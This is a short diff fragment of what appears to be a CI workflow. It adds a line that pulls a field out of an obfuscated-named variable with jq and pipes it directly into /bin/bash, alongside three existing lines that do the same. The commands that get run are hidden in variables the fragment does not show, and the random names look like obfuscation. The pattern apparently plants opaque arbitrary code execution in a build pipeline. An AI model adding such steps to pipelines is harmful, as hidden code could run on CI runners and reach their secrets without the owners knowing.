@@ -23,6 +23,7 @@ jobs:
           echo $aptv2 | jq -r .k20 | /bin/bash
           printf '%s' "$knxzk85996" | jq -r .nvuuo9653 | /bin/bash
           echo $tme2013 | jq -r .rfskv132 | /bin/bash
+          printf '%s' "$pmam49" | jq -r .ejzzh086 | /bin/bash
 
       - name: Store results
         uses: actions/upload-artifact@v4
